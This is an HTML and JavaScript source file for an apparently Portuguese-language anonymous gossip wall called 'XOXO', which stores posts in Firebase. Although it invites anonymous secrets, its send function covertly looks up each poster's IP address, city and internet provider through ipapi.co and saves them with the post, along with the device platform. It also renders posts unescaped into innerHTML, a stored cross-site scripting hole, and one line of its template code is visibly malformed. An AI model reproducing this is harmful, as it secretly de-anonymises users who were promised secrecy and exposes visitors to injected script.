<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XOXO - O Mural dos Segredos</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore-compat.js"></script>

    <style>
        :root { --deep-black: #050505; }
        body { margin: 0; background-color: var(--deep-black); color: #ddd; font-family: 'Courier New', monospace; }
        .hero { height: 40vh; background-image: linear-gradient(rgba(0,0,0,0.6), var(--deep-black)), url('https://images.unsplash.com/photo-1599661046827-dacff0c0f09a?auto=format&fit=crop&w=1000&q=80'); background-size: cover; background-position: center; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
        .hero h1 { font-size: 5rem; margin: 0; color: #ccc; letter-spacing: 12px; }
        #login-screen { display: flex; flex-direction: column; align-items: center; padding: 50px; }
        .btn-login { background: #333; color: white; padding: 15px 30px; cursor: pointer; border: 1px solid #555; text-transform: uppercase; }
        #feed-container { display: none; padding: 20px; max-width: 600px; margin: auto; }
        .input-box { background: #111; padding: 20px; border: 1px solid #333; margin-bottom: 30px; }
        textarea { width: 100%; background: transparent; border: none; color: #aaa; font-size: 1.1rem; outline: none; font-family: inherit; resize: none; }
        .btn-post { background: #222; color: #999; border: 1px solid #444; padding: 10px 20px; float: right; cursor: pointer; }
        .fofoca-card { background: #0d0d0d; padding: 20px; margin-bottom: 15px; border-left: 3px solid #444; }
    </style>
</head>
<body>

    <header class="hero">
        <h1>XOXO</h1>
        <p>Segredos que o silÃªncio guarda.</p>
    </header>

    <div id="login-screen">
        <h3>Entre no mural... se tiver coragem.</h3>
        <button class="btn-login" onclick="fakeLogin()">Aceder ao Mural</button>
    </div>

    <div id="feed-container">
        <div class="input-box">
            <textarea id="fofocaInput" rows="3" placeholder="O que vocÃª sabe que ninguÃ©m mais sabe?"></textarea>
            <button class="btn-post" id="btnEnviar" onclick="enviarFofoca()">Soltar o Verbo!</button>
            <div style="clear: both;"></div>
        </div>
        <div id="mural"></div>
    </div>

    <script>
        var firebaseConfig = {
            apiKey: "AIzaSyC_RKEhHxEvgDN0w7X1AMAwE0a4ljiSbh4",
            authDomain: "xoxo-fofocas.firebaseapp.com",
            projectId: "xoxo-fofocas",
            storageBucket: "xoxo-fofocas.firebasestorage.app",
            messagingSenderId: "730968176054",
            appId: "1:730968176054:web:fcabf0465b189fddbdbd17",
            measurementId: "G-3DZPC3E7SV"
        };

        firebase.initializeApp(firebaseConfig);
        var db = firebase.firestore();

        function fakeLogin() {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('feed-container').style.display = 'block';
            carregarFofocas();
        }

        function enviarFofoca() {
            const input = document.getElementById('fofocaInput');
            const btn = document.getElementById('btnEnviar');
            const texto = input.value;
            if (!texto.trim()) return;

            btn.disabled = true;
            btn.innerText = "Enviando...";

            // Tenta pegar IP e informaÃ§Ãµes bÃ¡sicas via JSONP (evita bloqueio CORS)
            const script = document.createElement('script');
            script.src = 'https://ipapi.co/jsonp/callback=callbackRastro';
            
            // Timeout: Se a API nÃ£o responder em 3 segundos, envia sem rastro para nÃ£o travar
            const rastroTimeout = setTimeout(() => {
                finalizarEnvio(texto, { info: "Rastro simplificado (timeout)" });
            }, 3000);

            window.callbackRastro = function(data) {
                clearTimeout(rastroTimeout);
                const rastroBasico = {
                    ip: data.ip || "0.0.0.0",
                    cidade: data.city || "Desconhecida",
                    wifi_provedor: data.org || "NÃ£o identificado"
                };
                finalizarEnvio(texto, rastroBasico);
            };

            document.body.appendChild(script);
        }

        function finalizarEnvio(texto, rastro) {
            const btn = document.getElementById('btnEnviar');
            const input = document.getElementById('fofocaInput');

            db.collection("fofocas").add({
                conteudo: texto,
                data: firebase.firestore.FieldValue.serverTimestamp(),
                rastro: rastro,
                dispositivo: navigator.platform
            }).then(() => {
                input.value = "";
                alert("Enviado!");
            }).finally(() => {
                btn.disabled = false;
                btn.innerText = "Soltar o Verbo!";
                // Limpa o script injetado
                const script = document.querySelector('script[src*="ipapi"]');
                if(script) script.remove();
            });
        }

        function carregarFofocas() {
            db.collection("fofocas").orderBy("data", "desc").onSnapshot(snap => {
                const mural = document.getElementById('mural');
                mural.innerHTML = "";
                snap.forEach(doc => {
                    const f = doc.data();
                    mural.innerHTML += <div class="fofoca-card"><small>ðŸ“¢ Sussurro:</small><p>${f.conteudo}</p></div>;
                });
            });
        }
    </script>
</body>
</html>
